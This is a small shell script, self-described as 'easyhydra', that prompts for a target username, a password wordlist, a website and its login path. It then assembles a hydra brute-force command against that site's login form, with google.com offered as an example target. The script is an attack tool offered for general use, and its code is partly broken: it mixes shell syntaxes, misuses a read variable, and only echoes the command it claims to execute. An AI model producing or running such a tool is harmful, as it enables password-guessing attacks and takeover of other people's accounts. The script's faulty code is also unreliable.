set $username = 0
set $directory = 0
set $site = 0
set $extlink = 0
set $response = 0

echo "
.________ ____   ____.______  .______  .___ ._______ .______  _____._._______
|    ___/ \   \_/   /:      \ :_ _   \ : __|:_.  ___\:      \ \__ _:|: .____/
|___    \  \___ ___/ |       ||   |   || : ||  : |/\ |   .   |  |  :|| : _/\ 
|       /    |   |   |   |   || . |   ||   ||    /  \|   :   |  |   ||   /  \
|__:___/     |___|   |___|   ||. ____/ |   ||. _____/|___|   |  |   ||_.: __/
   :                     |___| :/      |___| :/          |___|  |___|   :/   
                               :             :                               "

echo "Universal password cracking command generator"
echo "
What is the username that you want to crack?"
read username
echo "What is the directory of your wordlist? (usually /home/username/downloads/rockyou.txt)"
read $directory
echo "What website do you need this to run on? (google.com, etc)"
read site
echo "what is the login extention (site.com has the login page /login, so you would now enter /login for site)"
read extlink
echo "what is the response? (if you type an incorrect password what does it respond with? like Incorrect Password!"
read response
echo "Done! thanks for using easyhydra, hit enter to execute the command."


echo hydra -l $username -P $directory $site http-post-form "$extlink:username=^USER^&password=^PASS^:F=$response" -V